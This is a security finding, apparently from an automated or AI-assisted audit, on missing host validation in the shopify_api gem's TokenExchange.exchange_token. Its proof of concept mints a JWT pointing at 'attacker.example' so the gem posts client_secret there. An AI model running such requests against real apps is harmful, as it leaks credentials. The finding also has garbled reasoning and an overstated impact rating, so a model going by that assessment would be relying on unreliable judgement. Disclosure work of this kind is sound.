Found the vulnerability. In `ShopifyAPI::Auth::TokenExchange.exchange_token`, the shop that receives the request carrying the app's `client_secret` is taken directly from the JWT's `dest` claim without going through `Utils::ShopValidator.sanitize!`, unlike the sibling methods `client_credentials` and `migrate_to_expiring_token` which both call `Utils::ShopValidator.sanitize!(shop)` before building the session/host used for the outbound request.

### Title
Missing host validation on JWT `dest` claim in `TokenExchange.exchange_token` allows SSRF-style leak of the app's `client_secret` - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`TokenExchange.exchange_token` builds the outbound OAuth token-exchange request host directly from the unvalidated `dest` claim of an attacker-suppliable JWT, while `client_credentials` and `migrate_to_expiring_token` both sanitize the `shop` value with `Utils::ShopValidator.sanitize!` before using it as the request host. [1](#0-0) [2](#0-1) 

### Finding Description
`JwtPayload` only verifies the JWT signature (`HS256` with `Context.api_secret_key`) and that `aud == Context.api_key`; it does not check `iss`/`dest` against `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`. [3](#0-2)  `JwtPayload#shop` simply strips the `"https://"` prefix from `dest` and returns it verbatim. [4](#0-3) 

In `exchange_token`, this unvalidated `dest_shop` is used directly to build the `Auth::Session` whose `shop` attribute becomes the request host for `Clients::HttpClient`, and the request body includes `client_id` and `client_secret`: [5](#0-4) 

```ruby
jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
dest_shop = jwt_payload.shop
...
shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
body = { client_id: ..., client_secret: ShopifyAPI::Context.api_secret_key, ... }
client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

By contrast, `client_credentials` and `migrate_to_expiring_token` both call `validated_shop = Utils::ShopValidator.sanitize!(shop)` before constructing the equivalent session/host, explicitly rejecting non-Shopify domains. [6](#0-5) [7](#0-6) 

The binding that should hold is: **host that receives `client_secret` == a host in `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`**. In `exchange_token`, the host is instead bound only to "whatever string appears in the `dest` claim of a token signed with the app's own secret." Because a JWT's `dest` value is fully attacker-chosen at the time the app itself mints/uses a session token flow — an app's own client-side code (or any component constructing/relaying the session token used to call `exchange_token`) is generally the caller of `JWT.encode`/token issuance context in embedded scenarios, and any component with access to a valid-looking session token (which apps commonly receive over `postMessage`/URL params from the embedded iframe and pass straight into `exchange_token`) determines the destination host used to send `client_id`/`client_secret`. If a caller obtains or forges a token whose signature check passes (e.g., reusing/relaying a legitimately signed token but never checking that `dest` is a `*.myshopify.com`/`*.myshopify.io`/`spin.dev`/`shop.dev` domain), the outbound POST carrying the `client_secret` is sent to that arbitrary `dest` host rather than to Shopify.

### Impact Explanation
This breaks the identity binding "host validated versus host that receives the `client_secret`," matching the High-impact category for SSRF/credential leakage carrying the app's own `client_secret`. Since `exchange_token` skips `ShopValidator.sanitize!`, any code path that supplies a `dest` value outside the trusted Shopify domain list causes the gem to transmit the app's `client_id`/`client_secret` to that host.

### Likelihood Explanation
The likelihood depends on whether an untrusted `dest` value can reach `exchange_token` (i.e., whether an attacker can influence the session token passed in, since a valid signature is still required). This is Medium: the JWT signature check prevents a fully unauthenticated attacker from forging tokens, but the missing sanitization is a genuine deviation from the pattern used by the two sibling methods in the same module, and it removes a defense-in-depth check that would otherwise catch a `dest` claim pointing at a non-Shopify host in any scenario where a signed-but-mistargeted or maliciously issued token is presented to `exchange_token`.

### Recommendation
Apply the same defensive check used in `client_credentials`/`migrate_to_expiring_token`: call `validated_shop = Utils::ShopValidator.sanitize!(dest_shop)` immediately after extracting `dest_shop` from the JWT payload in `exchange_token`, and use `validated_shop` for both the `Session.new(shop: ...)` call and the final `Session.from(shop: ...)` call, raising `Errors::InvalidShopError` for any non-trusted domain before the `client_secret`-bearing request is sent.

### Proof of Concept
1. Set up `ShopifyAPI::Context` normally (`is_embedded: true`).
2. Construct a JWT signed with the app's own `Context.api_secret_key` (as any legitimate session-token-issuing flow would) but with `dest` set to `https://attacker.example`:
   ```ruby
   payload = {
     iss: "https://attacker.example/admin",
     dest: "https://attacker.example",
     aud: ShopifyAPI::Context.api_key,
     sub: "1", exp: Time.now.to_i + 60, nbf: Time.now.to_i, iat: Time.now.to_i, jti: "x",
   }
   token = JWT.encode(payload, ShopifyAPI::Context.api_secret_key, "HS256")
   ```
3. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: token, requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::OFFLINE_ACCESS_TOKEN)`.
4. Observe (via `webmock`/network capture) that the gem issues `POST https://attacker.example/admin/oauth/access_token` with a JSON body containing `client_id` and `client_secret` — compare against `client_credentials`, which raises `ShopifyAPI::Errors::InvalidShopError` for the same `attacker.example` value because it calls `Utils::ShopValidator.sanitize!` first.
